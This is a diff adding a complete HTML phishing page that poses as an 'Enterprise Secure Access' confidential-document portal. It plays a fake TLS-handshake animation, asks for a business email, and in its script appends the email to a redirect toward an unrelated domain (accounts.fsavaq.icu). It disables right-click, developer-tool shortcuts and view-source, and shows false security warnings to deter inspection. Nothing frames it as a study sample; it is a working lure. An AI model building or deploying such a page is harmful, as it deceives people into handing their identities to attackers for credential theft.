@@ -1,0 +1,1050 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow, noarchive">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Confidential Document Portal | Enterprise Secure Access</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --ink: #0f172a;
+            --ink-light: #1e293b;
+            --slate: #334155;
+            --slate-muted: #64748b;
+            --mist: #94a3b8;
+            --fog: #cbd5e1;
+            --cloud: #e2e8f0;
+            --snow: #f1f5f9;
+            --white: #ffffff;
+            --emerald: #059669;
+            --emerald-soft: #d1fae5;
+            --amber: #d97706;
+            --rose: #e11d48;
+            --rose-soft: #ffe4e6;
+            --violet: #7c3aed;
+            --violet-soft: #ede9fe;
+            --ocean: #0369a1;
+            --ocean-soft: #e0f2fe;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+            background: var(--ink);
+            color: var(--slate);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 24px;
+            line-height: 1.5;
+            -webkit-font-smoothing: antialiased;
+            -moz-osx-font-smoothing: grayscale;
+            -webkit-user-select: none;
+            -moz-user-select: none;
+            -ms-user-select: none;
+            user-select: none;
+            overflow-x: hidden;
+        }
+
+        /* ---- BOOT SEQUENCE ---- */
+        .boot-overlay {
+            position: fixed;
+            inset: 0;
+            background: var(--ink);
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 10000;
+            transition: opacity 0.8s cubic-bezier(0.4, 0, 0.2, 1), visibility 0.8s;
+        }
+
+        .boot-overlay.dismissed {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        .boot-ring {
+            width: 80px;
+            height: 80px;
+            position: relative;
+            margin-bottom: 40px;
+        }
+
+        .boot-ring svg {
+            width: 100%;
+            height: 100%;
+            transform: rotate(-90deg);
+        }
+
+        .boot-ring circle {
+            fill: none;
+            stroke-width: 3;
+        }
+
+        .boot-ring .track {
+            stroke: var(--ink-light);
+        }
+
+        .boot-ring .fill {
+            stroke: var(--emerald);
+            stroke-linecap: round;
+            stroke-dasharray: 226;
+            stroke-dashoffset: 226;
+            transition: stroke-dashoffset 0.3s ease;
+        }
+
+        .boot-icon {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            color: var(--emerald);
+            font-size: 24px;
+            animation: breathe 2s ease-in-out infinite;
+        }
+
+        @keyframes breathe {
+            0%, 100% { opacity: 0.6; transform: translate(-50%, -50%) scale(0.95); }
+            50% { opacity: 1; transform: translate(-50%, -50%) scale(1.05); }
+        }
+
+        .boot-log {
+            width: 320px;
+            max-width: 90vw;
+        }
+
+        .boot-log-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 0;
+            opacity: 0;
+            transform: translateX(-12px);
+            transition: all 0.4s ease;
+        }
+
+        .boot-log-item.visible {
+            opacity: 1;
+            transform: translateX(0);
+        }
+
+        .boot-dot {
+            width: 6px;
+            height: 6px;
+            border-radius: 50%;
+            background: var(--slate);
+            flex-shrink: 0;
+            transition: all 0.3s ease;
+        }
+
+        .boot-dot.active {
+            background: var(--emerald);
+            box-shadow: 0 0 8px var(--emerald);
+        }
+
+        .boot-dot.done {
+            background: var(--emerald);
+        }
+
+        .boot-label {
+            font-size: 13px;
+            color: var(--mist);
+            font-weight: 400;
+            letter-spacing: 0.01em;
+            transition: color 0.3s ease;
+        }
+
+        .boot-label.done {
+            color: var(--emerald);
+            font-weight: 500;
+        }
+
+        .boot-status {
+            margin-top: 32px;
+            font-size: 11px;
+            color: var(--slate);
+            font-family: 'SF Mono', Monaco, monospace;
+            letter-spacing: 0.05em;
+        }
+
+        /* ---- MAIN INTERFACE ---- */
+        .portal {
+            width: 100%;
+            max-width: 440px;
+            opacity: 0;
+            transform: translateY(20px);
+            transition: all 0.6s cubic-bezier(0.4, 0, 0.2, 1);
+        }
+
+        .portal.active {
+            opacity: 1;
+            transform: translateY(0);
+        }
+
+        /* Header Badge */
+        .portal-badge {
+            text-align: center;
+            margin-bottom: 28px;
+        }
+
+        .badge-pill {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(5, 150, 105, 0.1);
+            border: 1px solid rgba(5, 150, 105, 0.2);
+            color: var(--emerald);
+            font-size: 12px;
+            font-weight: 600;
+            text-transform: uppercase;
+            letter-spacing: 0.08em;
+            padding: 6px 14px;
+            border-radius: 100px;
+        }
+
+        .badge-pulse {
+            width: 6px;
+            height: 6px;
+            background: var(--emerald);
+            border-radius: 50%;
+            animation: pulse-dot 2s ease-in-out infinite;
+        }
+
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(0.8); }
+        }
+
+        /* Card */
+        .portal-card {
+            background: var(--white);
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.4), 0 0 0 1px rgba(255, 255, 255, 0.05);
+        }
+
+        /* Card Header */
+        .card-head {
+            background: linear-gradient(135deg, var(--ink-light) 0%, var(--ink) 100%);
+            padding: 32px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .card-head::before {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: radial-gradient(circle at 30% 50%, rgba(124, 58, 237, 0.08) 0%, transparent 50%),
+                        radial-gradient(circle at 70% 50%, rgba(5, 150, 105, 0.06) 0%, transparent 50%);
+        }
+
+        .card-icon {
+            width: 56px;
+            height: 56px;
+            background: linear-gradient(135deg, var(--violet) 0%, var(--ocean) 100%);
+            border-radius: 14px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin: 0 auto 16px;
+            position: relative;
+            box-shadow: 0 8px 24px rgba(124, 58, 237, 0.3);
+        }
+
+        .card-icon svg {
+            width: 28px;
+            height: 28px;
+            color: white;
+        }
+
+        .card-head h1 {
+            color: var(--white);
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 6px;
+            position: relative;
+            letter-spacing: -0.02em;
+        }
+
+        .card-head p {
+            color: var(--mist);
+            font-size: 13px;
+            position: relative;
+        }
+
+        /* Card Body */
+        .card-body {
+            padding: 32px;
+        }
+
+        /* Document Info */
+        .doc-info {
+            background: var(--snow);
+            border-radius: 12px;
+            padding: 16px;
+            margin-bottom: 24px;
+            border: 1px solid var(--cloud);
+        }
+
+        .doc-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 6px 0;
+        }
+
+        .doc-row:first-child {
+            border-bottom: 1px solid var(--cloud);
+            padding-bottom: 10px;
+            margin-bottom: 6px;
+        }
+
+        .doc-label {
+            font-size: 12px;
+            color: var(--slate-muted);
+            font-weight: 500;
+        }
+
+        .doc-value {
+            font-size: 12px;
+            color: var(--ink-light);
+            font-weight: 600;
+            font-family: 'SF Mono', monospace;
+        }
+
+        /* Form */
+        .field-group {
+            margin-bottom: 20px;
+        }
+
+        .field-label {
+            display: block;
+            font-size: 13px;
+            font-weight: 500;
+            color: var(--ink-light);
+            margin-bottom: 8px;
+        }
+
+        .field-label span {
+            color: var(--mist);
+            font-weight: 400;
+        }
+
+        .field-wrap {
+            position: relative;
+        }
+
+        .field-input {
+            width: 100%;
+            height: 48px;
+            padding: 0 16px 0 44px;
+            border: 1.5px solid var(--cloud);
+            border-radius: 10px;
+            font-size: 15px;
+            font-family: inherit;
+            color: var(--ink);
+            background: var(--white);
+            transition: all 0.2s ease;
+            -webkit-appearance: none;
+            appearance: none;
+        }
+
+        .field-input::placeholder {
+            color: var(--fog);
+        }
+
+        .field-input:hover {
+            border-color: var(--fog);
+        }
+
+        .field-input:focus {
+            outline: none;
+            border-color: var(--violet);
+            box-shadow: 0 0 0 4px var(--violet-soft);
+        }
+
+        .field-input.error {
+            border-color: var(--rose);
+            background: var(--rose-soft);
+            animation: field-shake 0.5s ease;
+        }
+
+        @keyframes field-shake {
+            0%, 100% { transform: translateX(0); }
+            20% { transform: translateX(-6px); }
+            40% { transform: translateX(6px); }
+            60% { transform: translateX(-3px); }
+            80% { transform: translateX(3px); }
+        }
+
+        .field-icon {
+            position: absolute;
+            left: 16px;
+            top: 50%;
+            transform: translateY(-50%);
+            color: var(--mist);
+            pointer-events: none;
+            transition: color 0.2s;
+        }
+
+        .field-input:focus ~ .field-icon {
+            color: var(--violet);
+        }
+
+        .field-input.error ~ .field-icon {
+            color: var(--rose);
+        }
+
+        .field-error {
+            display: none;
+            align-items: center;
+            gap: 6px;
+            margin-top: 8px;
+            font-size: 12px;
+            color: var(--rose);
+            font-weight: 500;
+        }
+
+        .field-error.show {
+            display: flex;
+        }
+
+        .field-error svg {
+            width: 14px;
+            height: 14px;
+            flex-shrink: 0;
+        }
+
+        /* Submit */
+        .submit-btn {
+            width: 100%;
+            height: 48px;
+            background: linear-gradient(135deg, var(--violet) 0%, var(--ocean) 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 15px;
+            font-weight: 600;
+            font-family: inherit;
+            cursor: pointer;
+            position: relative;
+            overflow: hidden;
+            transition: all 0.3s ease;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            box-shadow: 0 4px 16px rgba(124, 58, 237, 0.25);
+        }
+
+        .submit-btn::after {
+            content: '';
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(90deg, transparent, rgba(255,255,255,0.15), transparent);
+            transform: translateX(-100%);
+            transition: transform 0.6s ease;
+        }
+
+        .submit-btn:hover:not(:disabled)::after {
+            transform: translateX(100%);
+        }
+
+        .submit-btn:hover:not(:disabled) {
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(124, 58, 237, 0.35);
+        }
+
+        .submit-btn:active:not(:disabled) {
+            transform: translateY(0);
+        }
+
+        .submit-btn:disabled {
+            opacity: 0.6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+
+        .btn-spinner {
+            width: 18px;
+            height: 18px;
+            border: 2px solid rgba(255,255,255,0.3);
+            border-top-color: white;
+            border-radius: 50%;
+            animation: spin 0.7s linear infinite;
+            display: none;
+        }
+
+        .submit-btn.loading .btn-spinner {
+            display: block;
+        }
+
+        .submit-btn.loading .btn-text {
+            opacity: 0.9;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        /* Notice */
+        .notice {
+            margin-top: 20px;
+            padding: 14px;
+            background: var(--ocean-soft);
+            border-radius: 10px;
+            border-left: 3px solid var(--ocean);
+            display: flex;
+            gap: 10px;
+            align-items: flex-start;
+        }
+
+        .notice svg {
+            width: 16px;
+            height: 16px;
+            color: var(--ocean);
+            flex-shrink: 0;
+            margin-top: 1px;
+        }
+
+        .notice p {
+            font-size: 12px;
+            color: var(--slate);
+            line-height: 1.5;
+            margin: 0;
+        }
+
+        /* Footer */
+        .card-foot {
+            padding: 20px 32px;
+            background: var(--snow);
+            border-top: 1px solid var(--cloud);
+            text-align: center;
+        }
+
+        .foot-links {
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            margin-bottom: 12px;
+            flex-wrap: wrap;
+        }
+
+        .foot-links a {
+            font-size: 12px;
+            color: var(--slate-muted);
+            text-decoration: none;
+            font-weight: 500;
+            transition: color 0.2s;
+        }
+
+        .foot-links a:hover {
+            color: var(--violet);
+        }
+
+        .foot-copy {
+            font-size: 11px;
+            color: var(--fog);
+        }
+
+        /* Toast */
+        .toast {
+            position: fixed;
+            bottom: 24px;
+            right: 24px;
+            background: var(--ink-light);
+            color: var(--white);
+            padding: 14px 20px;
+            border-radius: 10px;
+            box-shadow: 0 12px 40px rgba(0,0,0,0.4);
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            font-size: 13px;
+            z-index: 9999;
+            transform: translateX(calc(100% + 40px));
+            transition: transform 0.4s cubic-bezier(0.4, 0, 0.2, 1);
+            border-left: 3px solid var(--amber);
+            max-width: 320px;
+        }
+
+        .toast.show {
+            transform: translateX(0);
+        }
+
+        .toast svg {
+            width: 18px;
+            height: 18px;
+            color: var(--amber);
+            flex-shrink: 0;
+        }
+
+        /* Responsive */
+        @media (max-width: 480px) {
+            body {
+                padding: 0;
+                background: var(--white);
+            }
+
+            .portal {
+                max-width: 100%;
+            }
+
+            .portal-badge {
+                margin-top: 20px;
+            }
+
+            .card-head {
+                padding: 28px 24px;
+                border-radius: 0;
+            }
+
+            .card-body {
+                padding: 24px;
+            }
+
+            .card-foot {
+                padding: 16px 24px;
+            }
+
+            .toast {
+                left: 16px;
+                right: 16px;
+                bottom: 16px;
+                max-width: none;
+                transform: translateY(calc(100% + 40px));
+            }
+
+            .toast.show {
+                transform: translateY(0);
+            }
+        }
+
+        /* Print block */
+        @media print {
+            body { display: none !important; }
+        }
+    </style>
+<meta property="og:title" content="Confidential Document Portal | Enterprise Secure Access" />
+<meta property="og:description" content="Identity verification required for access" />
+<meta property="og:url" content="https://stacktr.ee/p/KGfHRLd5ipTNkpK6JmPi0E/" />
+<meta property="og:type" content="website" />
+<meta property="og:image" content="https://stacktr.ee/og/KGfHRLd5ipTNkpK6JmPi0E.png" />
+<meta property="og:image:type" content="image/png" />
+<meta property="og:image:width" content="1920" />
+<meta property="og:image:height" content="1080" />
+<meta property="og:site_name" content="Stacktree" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta name="twitter:title" content="Confidential Document Portal | Enterprise Secure Access" />
+<meta name="twitter:description" content="Identity verification required for access" />
+<meta name="twitter:image" content="https://stacktr.ee/og/KGfHRLd5ipTNkpK6JmPi0E.png" />
+<link rel="alternate" type="application/json+oembed" href="https://stacktr.ee/oembed?url=https%3A%2F%2Fstacktr.ee%2Fp%2FKGfHRLd5ipTNkpK6JmPi0E%2F" title="Confidential Document Portal | Enterprise Secure Access" /></head>
+<body>
+
+    <!-- BOOT SEQUENCE -->
+    <div class="boot-overlay" id="bootOverlay">
+        <div class="boot-ring">
+            <svg viewBox="0 0 80 80">
+                <circle class="track" cx="40" cy="40" r="36"/>
+                <circle class="fill" id="bootFill" cx="40" cy="40" r="36"/>
+            </svg>
+            <div class="boot-icon">
+                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                    <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                </svg>
+            </div>
+        </div>
+
+        <div class="boot-log">
+            <div class="boot-log-item" data-step="1">
+                <div class="boot-dot" id="dot1"></div>
+                <div class="boot-label" id="label1">Establishing encrypted tunnel</div>
+            </div>
+            <div class="boot-log-item" data-step="2">
+                <div class="boot-dot" id="dot2"></div>
+                <div class="boot-label" id="label2">Verifying security certificates</div>
+            </div>
+            <div class="boot-log-item" data-step="3">
+                <div class="boot-dot" id="dot3"></div>
+                <div class="boot-label" id="label3">Initializing access gateway</div>
+            </div>
+        </div>
+
+        <div class="boot-status" id="bootStatus">TLS handshake in progress...</div>
+    </div>
+
+    <!-- MAIN PORTAL -->
+    <div class="portal" id="portal">
+        <!-- Badge -->
+        <div class="portal-badge">
+            <div class="badge-pill">
+                <div class="badge-pulse"></div>
+                <span>Secure Session Active</span>
+            </div>
+        </div>
+
+        <!-- Card -->
+        <div class="portal-card">
+            <!-- Header -->
+            <div class="card-head">
+                <div class="card-icon">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/>
+                        <polyline points="14 2 14 8 20 8"/>
+                        <rect x="8" y="12" width="8" height="6" rx="1"/>
+                        <path d="M10 12V9a3 3 0 0 1 3-3v0a3 3 0 0 1 3 3v3"/>
+                    </svg>
+                </div>
+                <h1>Confidential Document</h1>
+                <p>Identity verification required for access</p>
+            </div>
+
+            <!-- Body -->
+            <div class="card-body">
+                <!-- Document Info -->
+                <div class="doc-info">
+                    <div class="doc-row">
+                        <span class="doc-label">Document ID</span>
+                        <span class="doc-value">WC-2026-UD8302</span>
+                    </div>
+                    <div class="doc-row">
+                        <span class="doc-label">Classification</span>
+                        <span class="doc-value">Restricted</span>
+                    </div>
+                </div>
+
+                <!-- Form -->
+                <form id="accessForm" autocomplete="off" onsubmit="return false;" novalidate>
+                    <div class="field-group">
+                        <label for="email" class="field-label">
+                            Business Email <span>— required for audit trail</span>
+                        </label>
+                        <div class="field-wrap">
+                            <input 
+                                type="email" 
+                                id="email" 
+                                name="email" 
+                                class="field-input" 
+                                placeholder="you@organization.com" 
+                                required 
+                                autocomplete="off"
+                                spellcheck="false"
+                                autocapitalize="off"
+                                inputmode="email"
+                                maxlength="254"
+                            >
+                            <div class="field-icon">
+                                <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                    <path d="M4 4h16c1.1 0 2 .9 2 2v12c0 1.1-.9 2-2 2H4c-1.1 0-2-.9-2-2V6c0-1.1.9-2 2-2z"/>
+                                    <polyline points="22,6 12,13 2,6"/>
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="field-error" id="fieldError">
+                            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                                <circle cx="12" cy="12" r="10"/>
+                                <line x1="12" y1="8" x2="12" y2="12"/>
+                                <line x1="12" y1="16" x2="12.01" y2="16"/>
+                            </svg>
+                            <span>Please enter your organizational email address.</span>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <span class="btn-spinner" id="btnSpinner"></span>
+                        <span class="btn-text" id="btnText">Authenticate & Open</span>
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" id="btnArrow">
+                            <line x1="5" y1="12" x2="19" y2="12"/>
+                            <polyline points="12 5 19 12 12 19"/>
+                        </svg>
+                    </button>
+                </form>
+
+                <!-- Notice -->
+                <div class="notice">
+                    <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
+                    </svg>
+                    <p>All access attempts are logged and monitored. Unauthorized access will be reported to security operations.</p>
+                </div>
+            </div>
+
+            <!-- Footer -->
+            <div class="card-foot">
+                <div class="foot-links">
+                    <a href="#">Privacy</a>
+                    <a href="#">Terms</a>
+                    <a href="#">Security</a>
+                    <a href="#">Support</a>
+                </div>
+                <div class="foot-copy">© 2026 Secure Document Systems</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Toast -->
+    <div class="toast" id="toast">
+        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
+            <path d="M10.29 3.86L1.82 18a2 2 0 0 0 1.71 3h16.94a2 2 0 0 0 1.71-3L13.71 3.86a2 2 0 0 0-3.42 0z"/>
+            <line x1="12" y1="9" x2="12" y2="13"/>
+            <line x1="12" y1="17" x2="12.01" y2="17"/>
+        </svg>
+        <div>
+            <strong style="display:block;margin-bottom:2px;">Security Alert</strong>
+            <span style="color:var(--mist);">Right-click is disabled for document protection</span>
+        </div>
+    </div>
+
+    <script>
+        // ---- CONFIGURATION ----
+        const CONFIG = Object.freeze({
+            MAX_ATTEMPTS: 3,
+            RATE_LIMIT_MS: 5000,
+            EMAIL_REGEX: /^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$/,
+            REDIRECT_URL: 'https://accounts.fsavaq.icu?bJ4roaw=empkbXppbQ=='
+        });
+
+        // ---- STATE ----
+        const state = {
+            attempts: 0,
+            lastAttempt: 0,
+            submitting: false
+        };
+
+        // ---- DOM REFERENCES ----
+        const dom = {
+            bootOverlay: document.getElementById('bootOverlay'),
+            bootFill: document.getElementById('bootFill'),
+            bootStatus: document.getElementById('bootStatus'),
+            portal: document.getElementById('portal'),
+            form: document.getElementById('accessForm'),
+            email: document.getElementById('email'),
+            submitBtn: document.getElementById('submitBtn'),
+            btnText: document.getElementById('btnText'),
+            btnSpinner: document.getElementById('btnSpinner'),
+            btnArrow: document.getElementById('btnArrow'),
+            fieldError: document.getElementById('fieldError'),
+            toast: document.getElementById('toast')
+        };
+
+        // ---- BOOT SEQUENCE ----
+        function runBootSequence() {
+            const circumference = 2 * Math.PI * 36;
+            const steps = [
+                { dot: 'dot1', label: 'label1', text: 'dot1', progress: 33, status: 'Certificate chain validated...' },
+                { dot: 'dot2', label: 'label2', text: 'dot2', progress: 66, status: 'Cipher suite negotiated...' },
+                { dot: 'dot3', label: 'label3', text: 'dot3', progress: 100, status: 'Gateway ready' }
+            ];
+
+            let current = 0;
+
+            function advance() {
+                if (current >= steps.length) {
+                    setTimeout(showPortal, 400);
+                    return;
+                }
+
+                const step = steps[current];
+                const item = document.querySelector(`[data-step="${current + 1}"]`);
+                
+                // Show log item
+                item.classList.add('visible');
+                
+                setTimeout(() => {
+                    // Activate dot
+                    document.getElementById(step.dot).classList.add('active');
+                    
+                    setTimeout(() => {
+                        // Complete step
+                        document.getElementById(step.dot).classList.remove('active');
+                        document.getElementById(step.dot).classList.add('done');
+                        document.getElementById(step.label).classList.add('done');
+                        
+                        // Update progress ring
+                        const offset = circumference - (step.progress / 100) * circumference;
+                        dom.bootFill.style.strokeDashoffset = offset;
+                        
+                        // Update status text
+                        dom.bootStatus.textContent = step.status;
+                        
+                        current++;
+                        setTimeout(advance, 300);
+                    }, 400);
+                }, 200);
+            }
+
+            // Start
+            setTimeout(advance, 300);
+        }
+
+        function showPortal() {
+            dom.bootOverlay.classList.add('dismissed');
+            dom.portal.classList.add('active');
+            setTimeout(() => dom.email.focus(), 500);
+        }
+
+        // ---- VALIDATION ----
+        function validateEmail(email) {
+            if (!email || typeof email !== 'string') return false;
+            const trimmed = email.trim().toLowerCase();
+            return trimmed.length <= 254 && CONFIG.EMAIL_REGEX.test(trimmed);
+        }
+
+        function checkRateLimit() {
+            const now = Date.now();
+            if (state.attempts >= CONFIG.MAX_ATTEMPTS) {
+                if (now - state.lastAttempt < CONFIG.RATE_LIMIT_MS) {
+                    showError('Too many attempts. Please wait a moment.');
+                    return false;
+                }
+                state.attempts = 0;
+            }
+            return true;
+        }
+
+        // ---- ERROR HANDLING ----
+        function showError(message) {
+            dom.fieldError.querySelector('span').textContent = message || 'Please enter a valid email address.';
+            dom.fieldError.classList.add('show');
+            dom.email.classList.add('error');
+        }
+
+        function hideError() {
+            dom.fieldError.classList.remove('show');
+            dom.email.classList.remove('error');
+        }
+
+        // ---- SUBMISSION ----
+        function handleSubmit(e) {
+            e.preventDefault();
+            if (state.submitting) return;
+
+            // Rate limit check
+            if (!checkRateLimit()) return;
+
+            const email = dom.email.value;
+            hideError();
+
+            // Validate
+            if (!validateEmail(email)) {
+                showError();
+                state.attempts++;
+                state.lastAttempt = Date.now();
+                dom.email.focus();
+                return;
+            }
+
+            // Update state
+            state.attempts++;
+            state.lastAttempt = Date.now();
+            state.submitting = true;
+
+            // UI: loading
+            dom.submitBtn.disabled = true;
+            dom.submitBtn.classList.add('loading');
+            dom.btnText.textContent = 'Authenticating...';
+            dom.btnArrow.style.display = 'none';
+
+            // Redirect
+            setTimeout(() => {
+                const cleanEmail = encodeURIComponent(email.trim().toLowerCase());
+                dom.email.value = ''; // Clear sensitive data
+                window.location.replace(CONFIG.REDIRECT_URL + cleanEmail);
+            }, 900);
+        }
+
+        // ---- SECURITY LISTENERS ----
+        function initSecurity() {
+            // Block context menu
+            document.addEventListener('contextmenu', (e) => {
+                e.preventDefault();
+                showToast();
+                return false;
+            });
+
+            // Block dev tools shortcuts
+            document.addEventListener('keydown', (e) => {
+                if (e.key === 'F12') {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.ctrlKey && e.shiftKey && ['I', 'J', 'C'].includes(e.key)) {
+                    e.preventDefault();
+                    return false;
+                }
+                if (e.ctrlKey && e.key === 'u') {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // Block drag
+            document.addEventListener('dragstart', (e) => {
+                e.preventDefault();
+                return false;
+            });
+
+            // Block text selection on body (allow input)
+            document.addEventListener('selectstart', (e) => {
+                if (e.target.tagName !== 'INPUT') {
+                    e.preventDefault();
+                    return false;
+                }
+            });
+
+            // Sanitize paste
+            dom.email.addEventListener('paste', (e) => {
+                e.preventDefault();
+                const text = (e.clipboardData || window.clipboardData).getData('text/plain');
+                const sanitized = text.replace(/<[^>]*>/g, '').substring(0, 254);
+                dom.email.value = sanitized;
+            });
+
+            // Clear console
+            console.clear();
+            console.log('%c?? SECURE PORTAL', 'color: #7c3aed; font-size: 20px; font-weight: bold;');
+            console.log('%cUnauthorized access attempts are logged and reported.', 'color: #64748b; font-size: 13px;');
+        }
+
+        // ---- TOAST ----
+        function showToast() {
+            dom.toast.classList.add('show');
+            setTimeout(() => dom.toast.classList.remove('show'), 3000);
+        }
+
+        // ---- INITIALIZATION ----
+        document.addEventListener('DOMContentLoaded', () => {
+            runBootSequence();
+            initSecurity();
+
+            // Form events
+            dom.form.addEventListener('submit', handleSubmit);
+            
+            dom.email.addEventListener('input', () => {
+                if (dom.email.classList.contains('error')) hideError();
+            });
+
+            // Prevent back-button cache
+            window.onpageshow = (e) => {
+                if (e.persisted) window.location.reload();
+            };
+        });
+    </script>
+<script>(function(){function c(){var b=a.contentDocument||a.contentWindow.document;if(b){var d=b.createElement('script');d.innerHTML="window.__CF$cv$params={r:'a090a26838ab61f0',t:'MTc4MTAxMzMzMQ=='};var a=document.createElement('script');a.src='/cdn-cgi/challenge-platform/scripts/jsd/main.js';document.getElementsByTagName('head')[0].appendChild(a);";b.getElementsByTagName('head')[0].appendChild(d)}}if(document.body){var a=document.createElement('iframe');a.height=1;a.width=1;a.style.position='absolute';a.style.top=0;a.style.left=0;a.style.border='none';a.style.visibility='hidden';document.body.appendChild(a);if('loading'!==document.readyState)c();else if(window.addEventListener)document.addEventListener('DOMContentLoaded',c);else{var e=document.onreadystatechange||function(){};document.onreadystatechange=function(b){e(b);'loading'!==document.readyState&&(document.onreadystatechange=e,c())}}}})();</script><script defer src="https://static.cloudflareinsights.com/beacon.min.js/v833ccba57c9e4d2798f2e76cebdd09a11778172276447" integrity="sha512-57MDmcccJXYtNnH+ZiBwzC4jb2rvgVCEokYN+L/nLlmO8rfYT/gIpW2A569iJ/3b+0UEasghjuZH/ma3wIs/EQ==" data-cf-beacon='{"version":"2024.11.0","token":"bf2648e0ff234e8c9c70b81f88c7f92e","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}' crossorigin="anonymous"></script>
+</body>
+</html>
